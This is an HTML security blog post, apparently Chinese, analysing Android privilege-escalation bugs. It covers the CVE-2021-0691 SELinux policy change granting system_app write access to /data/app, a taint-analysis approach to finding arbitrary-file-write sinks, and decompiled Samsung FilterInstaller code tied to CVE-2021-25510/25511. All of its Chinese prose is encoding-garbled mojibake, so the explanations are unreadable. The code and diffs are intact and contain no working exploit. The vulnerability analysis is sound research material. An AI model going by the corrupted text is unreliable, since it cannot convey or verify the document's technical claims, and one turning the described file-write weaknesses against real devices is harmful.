<h1 id="1-CVE-2021-0691"><a href="#1-CVE-2021-0691" class="headerlink" title="1. CVE-2021-0691"></a>1. CVE-2021-0691</h1><p>è¿™æ˜¯ä¸€ä¸ªAOSPçš„æ¼æ´ï¼Œå¯¹äºæ­£å¸¸çš„<code>system_app</code>çš„<code>Selinux</code>ç­–ç•¥æ¥è®²ï¼Œä¸åº”è¯¥å…·å¤‡å†™<code>/data/app</code>ç›®å½•çš„æƒé™ï¼Œä½†æ˜¯Android 11 ä¸­å´åŠ å…¥äº†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index e5d7d18..1432017 100644</span><br><span class="line">--- a/private/system_app.te</span><br><span class="line">+++ b/private/system_app.te</span><br><span class="line">@@ -69,6 +69,9 @@</span><br><span class="line"><span class="comment"># Settings need to access app name and icon from asec</span></span><br><span class="line">allow system_app asec_apk_file:file r_file_perms;</span><br><span class="line">+# Allow system_app (adb data loader) to write data to /data/incremental</span><br><span class="line">+allow system_app apk_data_file:file write;</span><br><span class="line">+</span><br><span class="line"><span class="comment"># Allow system apps (like Settings) to interact with statsd</span></span><br><span class="line">binder_call(system_app, statsd)</span><br></pre></td></tr></table></figure>

<p><code>apk_data_file</code>æŒ‡çš„æ˜¯<code>/data/app</code>ï¼Œè¿™é‡Œå­˜æ”¾çš„æ˜¯åº”ç”¨ç¨‹åºçš„ä»£ç æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a70q:/data/app/com.unionpay.tsmservice-0bfCG-Zd90PuEwegtR8UzQ== # ls -lR</span><br><span class="line">.:</span><br><span class="line">total 6184</span><br><span class="line">-rw-r--r-- 1 system system 6308538 2021-01-01 01:22 base.apk</span><br><span class="line">drwxr-xr-x 3 system system 4096 2021-01-01 01:22 lib</span><br><span class="line">drwxrwx--x 3 system install 4096 2021-01-01 01:22 oat</span><br><span class="line">./lib:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 system system 4096 2021-01-01 01:22 arm64</span><br><span class="line">./lib/arm64:</span><br><span class="line">total 2092</span><br><span class="line">-rwxr-xr-x 1 system system 185816 1979-11-30 00:00 libentryexpro.so</span><br><span class="line">-rwxr-xr-x 1 system system 723744 1979-11-30 00:00 libuptsmaddon.so</span><br><span class="line">-rwxr-xr-x 1 system system 1216480 1979-11-30 00:00 libuptsmservice.so</span><br><span class="line">./oat:</span><br><span class="line">total 8</span><br><span class="line">drwxrwx--x 2 system install 4096 2021-01-01 01:22 arm64</span><br><span class="line">./oat/arm64:</span><br><span class="line">total 2588</span><br><span class="line">-rw-r--r-- 1 system all_a192 28672 2021-01-01 01:22 base.art</span><br><span class="line">-rw-r--r-- 1 system all_a192 87712 2021-01-01 01:22 base.odex</span><br><span class="line">-rw-r--r-- 1 system all_a192 2517132 2021-01-01 01:22 base.vdex</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ”¹åŠ¨æ„å‘³ç€ï¼Œæ‹¥æœ‰<code>system_app uid</code> çš„ç¨‹åºèƒ½å¤Ÿå»è¦†å†™å…¶ä»–APPçš„ä»£ç æ–‡ä»¶ï¼ŒåŒ…æ‹¬<code>so</code>å’Œ<code>base.apk</code>ï¼Œå®ç°ä»£ç æ³¨å…¥ã€‚è¿™ä¸ªä»£ç çš„å¼•å…¥æ˜¯å› ä¸º<code>incremental install</code>åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½ç”¨äºå¤§å°è¶…è¿‡1 GBçš„åº”ç”¨ç¨‹åºçš„å®‰è£…ï¼Œåœ¨<code>Android 11 Preview 1</code>ä¸­ï¼Œ<code>AdbDataLoader</code>è¢«åŠ å…¥ä»¥æ”¯æŒ<code>incremental install</code>ï¼Œå› æ­¤ï¼Œ<code>system_app</code>çš„ç­–ç•¥è¢«ä¿®æ”¹äº†ã€‚è™½ç„¶åæ¥ç»è¿‡äº†ä¸€äº›å˜åŠ¨ï¼ˆ<code>AdbDataLoader</code>è¢«ç§»é™¤äº†ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªç­–ç•¥å´è¢«ä¿ç•™äº†ä¸‹æ¥ã€‚</p>
<h1 id="2-æ¼æ´åˆ©ç”¨-é™æ€åˆ†æ"><a href="#2-æ¼æ´åˆ©ç”¨-é™æ€åˆ†æ" class="headerlink" title="2. æ¼æ´åˆ©ç”¨ - é™æ€åˆ†æ"></a>2. æ¼æ´åˆ©ç”¨ - é™æ€åˆ†æ</h1><p>ä¸ºäº†åˆ©ç”¨ç¬¬ä¸€æ­¥ä¸­å‘ç°çš„æ¼æ´ï¼Œåšäº†ä¸€äº›é™æ€åˆ†æçš„å·¥ä½œï¼Œå…¶å®ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ä»ç³»ç»Ÿåº”ç”¨ç¨‹åºä¸­ï¼Œæ‰¾åˆ°ä¸€ä¸ªbugï¼Œè¿™ä¸ªbugå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜å¯ä»¥è½¬åŒ–ä¸º<code>Java</code>è¯­è¨€çš„<code>source-sink</code>ç±»å‹çš„<code>data-flow</code>æ±¡ç‚¹åˆ†æé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨åŸºäº<code>Soot</code>çš„<a target="_blank" rel="noopener" href="https://github.com/Sable/heros"><code>IFDS</code></a>ï¼ˆ<code>Inter-procedure</code>ï¼Œ <code>Finite</code>ï¼Œ <code>Distributive</code>ï¼‰æ¡†æ¶è¿›è¡Œè§£å†³ã€‚</p>
<p>å¯¹äºä»»ä¸€æ±¡ç‚¹åˆ†æé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆåº”è¯¥å®šä¹‰æ¸…æ¥š<code>source</code>å’Œ<code>sink</code>ï¼Œå¯¹äº<code>source</code>çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<ol>
<li>å¯¼å‡ºçš„<code>Activity</code>ã€<code>Service</code>ã€<code>Broadcast Receiver</code>æˆ–<code>Content Provider</code>ä¸­æ¥æ”¶çš„<code>Intent</code>ï¼›</li>
<li>å¯æ§åˆ¶çš„è¾“å…¥æµä¸­æ¥æ”¶çš„æ•°æ®ï¼Œå¦‚<code>socket</code>ï¼›</li>
<li>å¯æ§åˆ¶çš„ä½ç½®å¤„æ¥æ”¶çš„æ–‡ä»¶ï¼Œå¦‚æ”»å‡»è€…åŒ…æ•°æ®å’Œå…¨å±€å¯è¯»&#x2F;å†™çš„ä½ç½®ã€‚</li>
</ol>
<p><code>sink</code>çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ–‡ä»¶è¾“å‡ºæµï¼›</li>
<li>åŠ¨æ€ä»£ç åŠ è½½åŠŸèƒ½ï¼›</li>
<li>å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ã€‚</li>
</ol>
<p>å‰©ä¸‹çš„å°±æ˜¯å»ä¼˜åŒ–äº†ï¼Œäº¬ä¸œæ˜¯ä½¿ç”¨äº†è‡ªå·±çš„åˆ†æå·¥å…·ï¼Œå«<code>Star Watcher</code>ï¼ŒåŸºäº<code>FlowDroid</code>ã€‚è¿™ä¸ªå·¥å…·çš„ç‰¹ç‚¹æ˜¯å¯¹ä¸Šä¸‹æ–‡ã€æµã€å­—æ®µå’Œå¯¹è±¡æ•æ„Ÿï¼Œå·¥ä½œåœ¨è¿‡ç¨‹é—´æ§åˆ¶æµå›¾ä¸Šï¼Œä¸ºäº†æ¯”å…¶ä»–å·¥å…·å¥½ï¼Œåœ¨è®¾è®¡æ—¶è€ƒè™‘äº†ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>æ„å»ºäº†ä¸€ä¸ªå®Œæ•´çš„è°ƒç”¨å›¾ï¼šä¸€ä¸ªå®Œæ•´çš„è°ƒç”¨å›¾æ˜¯æ‰€æœ‰åç»­åˆ†æçš„åŸºç¡€ï¼Œå¦‚æ•°æ®æµå’Œæ±¡ç‚¹åˆ†æã€‚ç›®å‰æœ€å…ˆè¿›çš„<code>SPARK</code> <code>Java</code>æŒ‡é’ˆåˆ†æï¼Œä¼šæ¼æ‰æŸäº›åˆ†é…èŠ‚ç‚¹ï¼Œå¦‚ï¼š</li>
</ol>
<p><strong>ä¾‹1</strong> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sample</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">target</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">for</span>(Helper helper: helpers)</span><br><span class="line">			helper.handle();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Set&lt;Helper&gt; helpers;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Sample</span> <span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.helpers = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">		<span class="built_in">this</span>.helpers.add(<span class="keyword">new</span> <span class="title class_">HelperImplA</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplA</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;wtf&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplB</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Spark</code>æŒ‡é’ˆåˆ†æä¸èƒ½å¤„ç†è¿™ç§æƒ…å†µï¼Œå³å…ƒç´ è¢«æ”¾å…¥å®¹å™¨ï¼Œç„¶åè¢«å–å‡ºï¼Œå®ƒä¸èƒ½åœ¨<code>handler.handle()</code>çš„è°ƒç”¨ä½ç½®å†³å®š<code>Helper</code>çš„ç±»å‹ã€‚å› æ­¤ï¼Œ<code>handler.handle</code>çš„è°ƒç”¨è¾¹åœ¨è°ƒç”¨å›¾ä¸­ç¼ºå¤±ã€‚å¦‚æœ<code>handle</code>å‡½æ•°ä¸­å­˜åœ¨å¯èƒ½çš„æ•°æ®æµï¼Œå°±ä¼šå¯¼è‡´é—æ¼ã€‚</p>
<p><strong>ä¾‹2</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AParcelable</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">AParcelable</span> <span class="variable">p</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">		p.func();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¾‹2ï¼Œ<code>AParcelable</code>ç±»çš„åˆ†é…æ˜¯åœ¨è§£<code>parcelable</code>æ—¶åœ¨åº“çš„ä»£ç ä¸­å®Œæˆçš„ï¼Œè¿™è¶…å‡ºäº†åˆ†æèŒƒå›´ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>Spark</code>ä¹Ÿæœªèƒ½æ­£ç¡®åœ°æ£€æµ‹åˆ°è¿™ä¸ªå˜é‡çš„åˆ†é…èŠ‚ç‚¹ï¼Œä»è€Œå¯¼è‡´è°ƒç”¨å›¾ä¸­ç›®æ ‡ç±»çš„è°ƒç”¨è¾¹ä¸¢å¤±ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œäº¬ä¸œä½¿ç”¨çš„åŠæ³•æ˜¯ç»“åˆCHAç®—æ³•ï¼Œé€šè¿‡CHAç®—æ³•ï¼Œå°†å¯èƒ½ä¸¢å¤±çš„è¾¹æ·»åŠ åˆ°è°ƒç”¨å›¾ä¸­ï¼Œå®éªŒè¯æ˜æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<p>ç»„ä»¶å…¥å£ç‚¹æ”¹å˜ä¹Ÿä¼šå½±å“åˆ°è°ƒç”¨å›¾çš„å®Œæ•´æ€§ï¼Œäº¬ä¸œçš„è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œå»ºç«‹ä¸€ä¸ªå‡çš„<code>main</code>æ–¹æ³•ï¼Œè°ƒç”¨æ‰€æœ‰ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•æ¥æ¨¡æ‹ŸAndroidæ¡†æ¶çš„è¡Œä¸ºã€‚æ¯”å¦‚è¯´ï¼Œåœ¨API 29ä¸­å¢åŠ äº†ä¸€ä¸ªæ–°çš„<code>Content Provider</code>çš„å‡½æ•°<code>call</code>çš„å˜ä½“ã€‚</p>
<ol start="2">
<li><p>é€šè¿‡èˆå¼ƒä¸ç›¸å…³çš„æ•°æ®æµä¼˜åŒ–æ‰§è¡Œæ€§èƒ½ï¼ŒIFDSç®—æ³•æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å®šç‚¹ç®—æ³•ã€‚å®ƒéœ€è¦ä¿ç•™ä¸æ¯ä¸ªè¯­å¥ç›¸å…³çš„æ•°æ®äº‹å®ï¼Œä»¥å†³å®šæˆ‘ä»¬æ˜¯å¦åº”è¯¥åœæ­¢ã€‚IFDSç®—æ³•çš„å·¥ä½œå¯¹è±¡æ˜¯è¿‡ç¨‹é—´çš„CFGï¼Œå¹¶å°†æµå‡½æ•°åˆ†ä¸ºå››ç§ç±»å‹ï¼š</p>
</li>
<li><p>NormalFlowFuntions </p>
</li>
<li><p>CallFlowFunctions</p>
</li>
<li><p>ReturnFlowFunctions</p>
</li>
<li><p>CallToReturnFlowFunctions</p>
</li>
</ol>
<p>å¯¹äºæ±¡ç‚¹çš„å®ä¾‹ï¼Œ<code>CallFlow</code>è´Ÿè´£å†³å®šæ˜¯å¦å°†å…¶ä¼ é€’ç»™è°ƒç”¨è€…å‡½æ•°ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœè°ƒç”¨è€…å‡½æ•°æ˜¯ä¸€ä¸ªå®ä¾‹è°ƒç”¨ï¼ˆ<code>virtual</code>å‡½æ•°ï¼‰ï¼ŒIFDSå°†ä¼ é€’è¿™ä¸ªæ±¡ç‚¹å®ä¾‹ï¼Œå¹¶è®°å½•å¯¹åº”è¯­å¥åˆ›å»ºçš„&#x2F;ç¼“å­˜çš„è¾¹ï¼Œå› ä¸ºæ±¡ç‚¹éšå¼åœ°ä¸<code>this</code>å®ä¾‹ç›¸å…³ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ä¾‹å­—æ®µä»æœªè¢«è¯»æˆ–å†™ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦ä¼ é€’å®ƒã€‚æ‰€ä»¥è¿™ä¸€ç‚¹æ˜¯å¯ä»¥è¿›è¡Œä¼˜åŒ–çš„ã€‚</p>
<p>é€šè¿‡å¯¹<code>icfg</code>è¿›è¡Œå¿«é€Ÿçš„é¢„æ£€æŸ¥å’Œç¼“å­˜å®ä¾‹åˆ†æï¼Œå¯ä»¥è§£å†³åŸæ¥ç®—æ³•çš„OOMé”™è¯¯ï¼Œå¹¶æé«˜è¿è¡Œé€Ÿåº¦ã€‚</p>
<h1 id="3-å‚å•†-bug"><a href="#3-å‚å•†-bug" class="headerlink" title="3. å‚å•† bug"></a>3. å‚å•† bug</h1><h2 id="3-1-Camera-å’Œ-FilterProvider-ä¸­çš„æƒé™æå‡"><a href="#3-1-Camera-å’Œ-FilterProvider-ä¸­çš„æƒé™æå‡" class="headerlink" title="3.1 Camera å’Œ FilterProvider ä¸­çš„æƒé™æå‡"></a>3.1 Camera å’Œ FilterProvider ä¸­çš„æƒé™æå‡</h2><p>æ¼æ´ç¼–å·ï¼šCVE-2021-25510ã€CVE-2021-25511ï¼Œå¹¶åœ¨2021å¹´12æœˆçš„ä¸‰æ˜Ÿå®‰å…¨å…¬å‘Šä¸­ä¿®å¤ã€‚</p>
<p>å½“ä¸€ä¸ªå…·æœ‰<code>com.sec.android.camera.permission.USE_EFFECT_FILTER</code>æƒé™å½“åŒ…è¢«å®‰è£…åï¼Œ<code>FilterProvider</code>è‡ªåŠ¨é€šè¿‡å…¶æ³¨å†Œçš„å¹¿æ’­æ¥æ”¶å™¨æ”¶åˆ°é€šçŸ¥ï¼Œå¹¶å°†å…¶è¯†åˆ«ä¸ºä¸€ä¸ª<code>CAMERA EFFECT FILTER</code>ã€‚ç›®æ ‡åŒ…ä¸­çš„æ–‡ä»¶è¢«æå–åˆ°<code>/data/DownFilters/Lib64/</code>ï¼Œå‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FilterInstaller</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> String <span class="title function_">copyFileFromAssets</span><span class="params">(AssetManager arg10, String arg11, String arg12, <span class="type">boolean</span> arg13)</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">installLibFilter</span><span class="params">(Context arg11, String arg12)</span> &#123;</span><br><span class="line">		Resources v11_1;</span><br><span class="line">		Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;install filter for Lib&quot;</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v11_1 = arg11.getPackageManager().getResourcesForApplication(arg12);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(PackageManager.NameNotFoundException v11) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, resource error, package name : &quot;</span> + arg12 + <span class="string">&quot;, exception : &quot;</span> + v11.toString());</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">AssetManager</span> <span class="variable">v12</span> <span class="operator">=</span> v11_1.getAssets();</span><br><span class="line">		String[] v2 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v2 = v12.list(<span class="string">&quot;so&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException v3) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, asset lib list exception : &quot;</span> + v3.toString());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(v2.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;asset lib list length is small than 0&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> <span class="variable">v3_1</span> <span class="operator">=</span> v2.length;</span><br><span class="line">		<span class="type">int</span> v4;</span><br><span class="line">		<span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3_1; ++v4) &#123;</span><br><span class="line">			<span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> v2[v4];</span><br><span class="line">			Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;filterFile : &quot;</span> + v5);</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">this</span>.storeLibFilters(v12, v11_1, v5, v5.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]) == -<span class="number">1L</span> &amp;&amp; (v5.endsWith(<span class="string">&quot;.so&quot;</span>))) &#123;</span><br><span class="line">				Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;storeLibFilters fail&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">this</span>.mServiceContext.getContentResolver().notifyChange(Constants.URI_NOTIFY_ADD, <span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="type">long</span> <span class="title function_">storeLibFilters</span><span class="params">(AssetManager arg18, Resources arg19, String arg20, String arg21)</span> &#123;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">if</span>((arg20.endsWith(<span class="string">&quot;.so&quot;</span>)) &amp;&amp; !<span class="built_in">this</span>.checkSoSignature(v6)) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;Signature check failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1L</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!arg20.endsWith(<span class="string">&quot;.sig&quot;</span>)) &#123;</span><br><span class="line">			<span class="type">ContentResolver</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.mServiceContext.getContentResolver();</span><br><span class="line">			<span class="type">ContentValues</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="type">int</span> <span class="variable">v8_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_title&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v9_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_vendor&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_version&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;title = &quot;</span> + arg19.getString(v8_1) + <span class="string">&quot; vendor = &quot;</span> + arg19.getString(v9_1) + <span class="string">&quot;, version = &quot;</span> + arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;name&quot;</span>, arg19.getString(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;filename&quot;</span>, v6);</span><br><span class="line">			v11.put(<span class="string">&quot;version&quot;</span>, arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor&quot;</span>, arg19.getString(v9_1));</span><br><span class="line">			v11.put(<span class="string">&quot;package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			v11.put(<span class="string">&quot;title_id&quot;</span>, Integer.valueOf(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;preload_filter&quot;</span>, Integer.valueOf(<span class="number">0</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;filter_type&quot;</span>, <span class="string">&quot;SINGLE&quot;</span>);</span><br><span class="line">			v11.put(<span class="string">&quot;category&quot;</span>, Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor_package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="keyword">if</span>(v0_2 != <span class="literal">null</span>) &#123;</span><br><span class="line">				v11.put(<span class="string">&quot;texture&quot;</span>, v13);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

